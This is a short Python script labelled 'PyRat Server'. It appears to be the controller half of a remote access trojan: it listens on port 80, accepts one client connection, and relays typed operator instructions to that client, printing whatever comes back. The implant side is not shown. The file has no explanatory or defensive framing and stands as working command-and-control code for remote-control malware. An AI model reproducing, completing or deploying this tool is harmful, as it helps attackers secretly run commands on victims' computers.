#imports
import socket
import os
 
#Variables
port = 80
 
#Functions
 
def clear():
    os.system('cls' if os.name=='nt' else 'clear')
 
#Starting Server
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
serversocket.bind((host, port))
serversocket.listen(1)
 
clear()
print("-:-:-:-:-:PyRat Server:-:-:-:-:-")
clientsocket, addr = serversocket.accept()
print("Connection from: " + str(addr))
while True:
    msg = input("Your Instruction: ")
 
    if msg == "help":
        clear()
        print("-+-+-+-+-+HELP+-+-+-+-+-")
        print("Test Connection: 'test'")
       
        input("\nPress ENTER to continue")
        clear()
        print("-:-:-:-:-:PyRat Server:-:-:-:-:-")
   
    else:
        msg = msg.encode("UTF-8")
        clientsocket.send(msg)
        msg = clientsocket.recv(4096)
        print(msg.decode("UTF-8"))